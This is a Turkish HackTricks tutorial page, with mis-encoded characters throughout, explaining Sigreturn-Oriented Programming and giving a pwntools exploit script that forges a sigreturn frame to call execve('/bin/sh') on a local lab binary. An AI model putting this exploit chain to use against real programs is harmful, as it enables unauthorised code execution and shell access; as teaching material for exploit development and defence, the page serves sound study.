# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

**`Sigreturn`,** genellikle bir sinyal iÅŸleyicisi iÅŸlemini tamamladÄ±ktan sonra temizlik yapmak iÃ§in kullanÄ±lan Ã¶zel bir **sistem Ã§aÄŸrÄ±sÄ±dÄ±r (syscall)**. Sinyaller, genellikle bir istisnai durumun meydana geldiÄŸini belirtmek iÃ§in iÅŸletim sistemi tarafÄ±ndan bir programa gÃ¶nderilen kesilmelerdir. Bir program bir sinyal aldÄ±ÄŸÄ±nda, mevcut Ã§alÄ±ÅŸmasÄ±nÄ± geÃ§ici olarak durdurur ve sinyali bir **sinyal iÅŸleyici** ile iÅŸlemek Ã¼zere tasarlanmÄ±ÅŸ Ã¶zel bir iÅŸlevle ele alÄ±r.

Sinyal iÅŸleyicisi iÅŸini bitirdikten sonra, programÄ±n **Ã¶nceki durumuna geri dÃ¶nmesi** gerekir, sanki hiÃ§bir ÅŸey olmamÄ±ÅŸ gibi. Ä°ÅŸte burada **`sigreturn`** devreye girer. ProgramÄ±, sinyal iÅŸleyicisinden **geri dÃ¶nmeye** ve sinyal iÅŸleyicisi tarafÄ±ndan kullanÄ±lan **yÄ±ÄŸÄ±n Ã§erÃ§evesini** (iÅŸlev Ã§aÄŸrÄ±larÄ±nÄ± ve yerel deÄŸiÅŸkenleri depolayan bellek bÃ¶lÃ¼mÃ¼) temizleyerek programÄ±n durumunu geri yÃ¼klemesine yardÄ±mcÄ± olur.

Ä°lginÃ§ olan kÄ±sÄ±m, **`sigreturn`**'un programÄ±n durumunu nasÄ±l geri yÃ¼klediÄŸidir: bunu yaparken **CPU'nun tÃ¼m kayÄ±t deÄŸerlerini yÄ±ÄŸÄ±nda depolar.** Sinyal artÄ±k engellenmediÄŸinde, **`sigreturn` bu deÄŸerleri yÄ±ÄŸÄ±ndan Ã§Ä±karÄ±r**, etkili bir ÅŸekilde CPU'nun kayÄ±t deÄŸerlerini sinyalin ele alÄ±ndÄ±ÄŸÄ± durumlarÄ±na sÄ±fÄ±rlar. Bu, mevcut yÄ±ÄŸÄ±nÄ±n en Ã¼st kÄ±smÄ±na iÅŸaret eden yÄ±ÄŸÄ±n iÅŸaretÃ§isi kayÄ±t (RSP) de dahil olmak Ã¼zere CPU'nun kayÄ±t deÄŸerlerini iÃ§erir.

{% hint style="danger" %}
`sigreturn` sistem Ã§aÄŸrÄ±sÄ±nÄ± ROP zincirinden Ã§aÄŸÄ±rarak ve **istediÄŸimiz kayÄ±t deÄŸerlerini** yÄ±ÄŸÄ±nda **ekleyerek**, tÃ¼m kayÄ±t deÄŸerlerini **kontrol etmek** ve bu nedenle Ã¶rneÄŸin `/bin/sh` ile `execve` sistem Ã§aÄŸrÄ±sÄ±nÄ± **Ã§aÄŸÄ±rmak mÃ¼mkÃ¼ndÃ¼r.**
{% endhint %}

Dikkat edin, bu, diÄŸer Ret2syscall'larÄ± Ã§aÄŸÄ±rmayÄ± kolaylaÅŸtÄ±ran bir tÃ¼r Ret2syscall olacaktÄ±r:

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

Daha iyi bir aÃ§Ä±klama iÃ§in ayrÄ±ca ÅŸuraya bakÄ±n:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Ã–rnek

[**Burada bir Ã¶rnek bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), ancak buradan sonraki saldÄ±rÄ±:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
## Referanslar

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
